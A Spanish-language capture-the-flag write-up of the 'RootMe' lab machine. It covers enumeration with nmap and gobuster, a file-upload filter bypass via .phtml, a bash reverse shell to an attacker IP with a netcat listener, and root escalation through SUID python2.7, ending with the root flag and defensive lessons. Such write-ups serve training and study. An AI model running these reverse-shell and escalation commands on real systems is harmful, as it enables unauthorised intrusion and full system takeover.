+++
title = "RootMe"
author = ["aisak"]
date = 2026-01-01
draft = false
+++

<div class="ox-hugo-toc toc">

<div class="heading">Table of Contents</div>

- [Introducción](#introducción)
- [Fase 1: Enumeración de Red (Nmap)](#fase-1-enumeración-de-red--nmap)
    - [Resultados relevantes](#resultados-relevantes)
- [**Puerto 80:** Apache 2.4.41](#puerto-80-apache-2-dot-4-dot-41)
- [**Puerto 22:** SSH abierto (OpenSSH 8.2p1).](#puerto-22-ssh-abierto--openssh-8-dot-2p1--dot)
        - [Hallazgos Críticos](#hallazgos-críticos)
    - [Preparación del listener](#preparación-del-listener)
    - [Payload de reverse shell](#payload-de-reverse-shell)
    - [Ejecución del payload](#ejecución-del-payload)
    - [Estabilización de la shell (opcional)](#estabilización-de-la-shell--opcional)
- [Fase 4: Enumeración local y obtención de la user flag](#fase-4-enumeración-local-y-obtención-de-la-user-flag)
- [Fase 5: Identificación del vector de escalada (SUID)](#fase-5-identificación-del-vector-de-escalada--suid)
    - [Resultado crítico](#resultado-crítico)
- [`/usr/bin/python2.7`](#usr-bin-python2-dot-7)
- [Fase 6: Escalada de privilegios final](#fase-6-escalada-de-privilegios-final)
    - [Verificación de privilegios](#verificación-de-privilegios)
    - [Obtención de la root flag](#obtención-de-la-root-flag)
- [Conclusión](#conclusión)

</div>
<!--endtoc-->



## Introducción {#introducción}

Este documento describe el proceso completo de compromiso de la máquina **RootMe**, abarcando desde la enumeración inicial hasta la escalada final de privilegios.


## Fase 1: Enumeración de Red (Nmap) {#fase-1-enumeración-de-red--nmap}

Se realizó un escaneo agresivo para identificar servicios y versiones expuestas.

```bash
nmap -A 10.65.136.57
```


### Resultados relevantes {#resultados-relevantes}


## **Puerto 80:** Apache 2.4.41 {#puerto-80-apache-2-dot-4-dot-41}

-   La cookie de sesión no tiene configurado el flag `HttpOnly` (vulnerabilidad de bajo impacto, no explotable directamente en este escenario).


## **Puerto 22:** SSH abierto (OpenSSH 8.2p1). {#puerto-22-ssh-abierto--openssh-8-dot-2p1--dot}

-   Fase 2: Enumeración Web (Gobuster)
    Para descubrir rutas ocultas se utilizó `gobuster` con un diccionario común.

<!--listend-->

```bash
gobuster dir -u [http://10.65.136.57](http://10.65.136.57) -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,md,js
```


#### Hallazgos Críticos {#hallazgos-críticos}

-   `/panel/`
    Panel con funcionalidad de subida de archivos.

-   `/uploads/`
    Directorio accesible donde se almacenan los archivos subidos.

-   `/js/`, `/css/`
    Recursos estáticos.

-   Fase 3: Ganando acceso (File Upload + Reverse Shell)
    El panel de subida validaba extensiones comunes como `.php`, pero permitía `.phtml`, extensión que Apache interpreta igualmente como PHP. Esto permitió la ejecución de código arbitrario.


### Preparación del listener {#preparación-del-listener}

En la máquina atacante (Kali):

```bash
nc -lvnp 1234
```


### Payload de reverse shell {#payload-de-reverse-shell}

Se utilizó un one-liner en Bash para obtener una conexión interactiva:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.209.208/1234 0>&1'
```


### Ejecución del payload {#ejecución-del-payload}

El payload se ejecutó accediendo al archivo subido:

`[http://10.65.136.57/uploads/pwn.phtml?cmd=bash%20-c%20...=](http://10.65.136.57/uploads/pwn.phtml?cmd=bash%20-c%20...`)


### Estabilización de la shell (opcional) {#estabilización-de-la-shell--opcional}

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```


## Fase 4: Enumeración local y obtención de la user flag {#fase-4-enumeración-local-y-obtención-de-la-user-flag}

Tras obtener acceso como `www-data`, se localizó la flag de usuario.

```bash
cat /home/*/user.txt
```


## Fase 5: Identificación del vector de escalada (SUID) {#fase-5-identificación-del-vector-de-escalada--suid}

Se buscaron binarios con el bit **SUID** activo pertenecientes a root.

```bash
find / -type f -user root -perm -4000 2>/dev/null
```


### Resultado crítico {#resultado-crítico}

Entre los binarios estándar, destacó:


## `/usr/bin/python2.7` {#usr-bin-python2-dot-7}

Al tratarse de un intérprete, permite ejecutar comandos arbitrarios con privilegios de root. Esta técnica está documentada en **GTFOBins**.


## Fase 6: Escalada de privilegios final {#fase-6-escalada-de-privilegios-final}

Se explotó el binario SUID de Python para invocar una shell privilegiada.

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```


### Verificación de privilegios {#verificación-de-privilegios}

```bash
whoami

# root

```


### Obtención de la root flag {#obtención-de-la-root-flag}

```bash
cd /root
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```


## Conclusión {#conclusión}

La máquina RootMe evidencia la importancia de:

-   Validar correctamente las extensiones de archivos subidos.
-   Restringir el uso de intérpretes con permisos SUID.

Una mala configuración, combinada con una vulnerabilidad web simple, permitió el compromiso total del sistema.
